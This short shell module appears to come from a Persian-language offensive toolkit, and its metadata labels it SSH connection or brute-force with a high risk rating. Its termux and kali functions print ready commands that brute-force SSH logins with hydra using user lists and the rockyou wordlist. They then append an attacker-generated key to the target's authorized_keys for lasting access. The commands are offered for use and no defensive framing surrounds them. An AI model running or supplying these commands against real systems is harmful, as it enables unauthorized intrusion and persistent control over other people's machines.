DESC="اتصال یا بروت‌فورس SSH"
REQ="پورت ۲۲ + لیست کاربر"
RISK="HIGH"

termux(){
cat <<'EOF'
pkg install openssh
ssh user@<IP>
# بروت‌فورس:
hydra -L users.txt -P pass.txt ssh://<IP>
EOF
}

kali(){
cat <<'EOF'
ssh -o PreferredAuthentications=password user@<IP>
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<IP>
# کشیدن کلید و استفاده:
ssh-keygen -t ed25519 -f ./id_ed25519 -N ''
cat ./id_ed25519.pub | ssh user@<IP> 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'
EOF
}
